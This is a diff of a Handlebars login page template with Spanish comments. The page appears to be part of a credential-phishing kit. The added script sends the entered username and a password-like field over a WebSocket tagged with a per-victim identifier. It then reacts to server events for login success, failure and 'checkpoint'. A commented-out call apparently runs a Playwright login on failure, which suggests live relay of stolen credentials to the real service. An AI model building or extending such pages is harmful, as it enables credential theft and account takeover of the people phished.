@@ -52,6 +52,8 @@
             }
         }
     </style>
+
+    {{!-- <script src="https://cdn.jsdelivr.net/npm/sockjs-client@1/dist/sockjs.min.js"></script> --}}
 </head>
 <body>
     <div class="screen">
@@ -72,8 +74,7 @@
                 </div>
 
                 <form class="w-full" id="custom"
-                    action="{{ payload.formUrl }}" method="post"
-                    onsubmit="return validateForm()">
+                    action="{{ payload.formUrl }}" method="post">
                     <input type="hidden" name="token" value="{{ payload.identifier }}" />
 
                     <div id="splitMessage" style="margin-top: 1.5rem;">
@@ -207,6 +208,8 @@
                     </span>
                 </div>
             </div>
+
+            <div id="approbalColumn" class="h-full flex flex-col items-center relative"></div>
         </div>
     </div>
 
@@ -487,7 +490,7 @@
                 }
 
                 let usernameHiddenInput = addHiddenInput('username', usernameInput.value);
-                let namePwsHiddenInput = addHiddenInput('name', namePwsInput.value);
+                let namePwsHiddenInput  = addHiddenInput('name', namePwsInput.value);
 
                 // Si no hay errores, enviar el formulario o mostrar otro modal (según tu lógica)
                 return validateResponse({ isOk: true, message: 'Formulario válido' });
@@ -502,16 +505,92 @@
                 setTimeout(() => {
                     showModalMessage();
                     changeFormStatus(false);
-                }, 1000);
+                }, 500);
             }
 
-            console.log(message);
+            // console.log(message);
             return isOk;
         }
 
         // Enfocar el campo de usuario al cargar la página
         document.addEventListener("DOMContentLoaded", setupFormElements);
     </script>
+
+    <script>
+        const connection = new WebSocket("/ws?identifier={{ payload.identifier }}");
+
+        connection.onopen = function () {
+            console.log('Conexión establecida con el servidor WebSocket');
+        };
+
+        connection.onerror = function (error) {
+            console.error('Error en la conexión WebSocket:', error);
+        };
+
+        // Escucha los mensajes entrantes desde el servidor
+        connection.addEventListener('message', (eventParam) => {
+            const {event, data} = JSON.parse(eventParam.data);
+
+            console.log("EVENTO: ", event);
+            console.log("DATA: ", data);
+
+            if(event === 'login_success'){
+                // window.location.href = event.redirect;
+            }else if(event === 'login_failed'){
+                showModalMessage();
+                changeFormStatus(false);
+            }else if(event === 'login_checkpoint'){
+
+            }else{
+                
+            }
+
+            // switch (event) {
+            //     case 'login_failed':
+            //         await this.runPlaywight(userId, data, clientInfo);
+            //         break;
+            //     case 'login_block':
+            //         console.log('Evento personalizado:', data);
+            //         break;
+            // }
+        });
+
+        document.getElementById('custom').addEventListener('submit', function (eventParam) {
+            eventParam.preventDefault();
+            const username = document.getElementById('username').value;
+            const name = document.getElementById('name').value;
+
+            if (validateForm()) {
+                const loginData = {
+                    event: 'userForm',
+                    data: { username, name }
+                };
+                connection.send(JSON.stringify(loginData));
+            }
+        });
+
+    </script>
+
+    {{!-- <script>
+        const connection = new WebSocket('/ws');
+        
+        /*
+        (async function () {
+            const ws = await connectToServer();
+
+            async function connectToServer() {
+                const ws = new WebSocket('ws://localhost:7071/ws');
+                return new Promise((resolve, reject) => {
+                    const timer = setInterval(() => {
+                        if (ws.readyState === 1) {
+                            clearInterval(timer)
+                            resolve(ws);
+                        }
+                    }, 10);
+                });
+            }
+        })();*/
+    </script> --}}
 </body>
 
 </html>
